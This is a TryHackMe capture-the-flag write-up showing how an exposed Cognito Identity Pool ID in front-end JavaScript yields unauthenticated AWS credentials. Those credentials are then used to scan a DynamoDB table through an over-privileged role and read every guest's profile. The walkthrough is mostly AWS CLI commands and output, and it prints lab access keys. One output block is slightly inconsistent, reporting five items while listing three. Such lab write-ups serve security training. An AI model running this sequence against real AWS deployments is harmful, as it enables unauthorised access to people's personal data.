[Writeup] TryHackMe - Hacker Holidays 2026: Day 3 - Complimentary
---
Category: Cloud Security / AWS Misconfiguration

Difficulty: Medium

Keywords: AWS Cognito, Identity Pool, STS, DynamoDB, Access Control Bypass
Introduction & Objectives
# Objective
The Byte Lotus wellness platform provides guests with immediate, frictionless access to personalized profiles without requiring a traditional login screen. But behind the beautiful web interfaces lies a complex cloud infrastructure. A misplaced configuration file or an unauthenticated cloud asset can give a guest complete access to data they were never meant to see.

The objective of Day 3 is to shift our focus from traditional web server exploitation to Cloud Infrastructure Security (AWS). We need to analyze front-end configuration elements, interact with AWS Cognito to obtain unauthenticated temporary credentials, and exploit an over-privileged IAM role to extract hidden records from a DynamoDB table.

# Recone
Step 1: Front-End Source Code Enumeration

We begin by exploring the target web application. While auditing public directories and front-end JavaScript elements (app.js), we locate an exposed configuration block responsible for handling guest access behind the scenes:
```java
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";

AWS.config.region = AWS_REGION;
AWS.config.credentials = new AWS.CognitoIdentityCredentials({
  IdentityPoolId: IDENTITY_POOL_ID,
});
```
Key Information Discovered:

    IDENTITY_POOL_ID: The Cognito Identity Pool ID configured to grant temporary AWS access to unauthenticated guest visitors.

    AWS_REGION: The target AWS region (us-east-1).

    TABLE_NAME: The target DynamoDB table storing guest profiles (complimentary-GuestWellnessProfiles).
    Step 2: Requesting an Identity ID via AWS CLI

To interact with the resort's AWS cloud components, we switch to our attack terminal and use the official AWS Command Line Interface (AWS CLI). Before AWS Cognito issues temporary credentials, it requires an unauthenticated Identity ID tied to that pool.

We execute aws cognito-identity get-id:
```bash
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
  ```
  The server processes the request and returns a unique session identifier for our unauthenticated session:
```json
{
    "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
}
```

Step 3: Exchanging the Identity ID for Temporary AWS Credentials

Next, we pass the retrieved IdentityId back to Cognito to receive temporary AWS security keys (AccessKeyId, SecretKey, and SessionToken).

We run get-credentials-for-identity:

```bash
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
  ```
Server Response:
```json
{
    "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13",
    "Credentials": {
        "AccessKeyId": "ASIAU2VYTBGYKP67ULN3",
        "SecretKey": "s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi",
        "SessionToken": "IQoJb3JpZ2luX2VjELv...",
        "Expiration": "2026-07-29T20:56:55+01:00"
    }
}
```
To instruct the local AWS CLI to use these temporary credentials, we export them as environment variables:
```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKP67ULN3"
export AWS_SECRET_ACCESS_KEY="s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELv..."
export AWS_DEFAULT_REGION="us-east-1"
```
To verify if our programmatic identity is working and to check who we are executing commands as, we query the AWS Security Token Service (STS):
```bash
aws sts get-caller-identity
```
Server Response:
```json
{
    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
```
This confirms we have successfully assumed the complimentary-cognito-unauth-role.
Step 4: Direct Database Enumeration & Extracting the Target Flag

As hinted by the application flow ("don't just check what it gives YOU. ask it for more"), the UI restricts users to viewing only their own profile. However, we need to test if the underlying IAM role enforces row-level security or if it suffers from over-privileged permissions.

We query the DynamoDB table directly using aws dynamodb scan:
```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```
Server Response:
```json
{
    "Items": [
        {
            "guest_id": { "S": "guest-vibe" },
            "name": { "S": "Vibe (Move Fast & Break Things)" },
            "email": { "S": "vibe@hackerholidays.thm" }
        },
        {
            "guest_id": { "S": "guest-lambo" },
            "name": { "S": "Lambo (@0xMia)" },
            "email": { "S": "lambo@hackerholidays.thm" }
        },
        {
            "guest_id": { "S": "guest-vip-042" },
            "name": { "S": "Guest VIP-042" },
            "notes": { 
                "S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{***}" 
            }
        }
    ],
    "Count": 5,
    "ScannedCount": 5
}
```
**Flag:** `THM{***}`
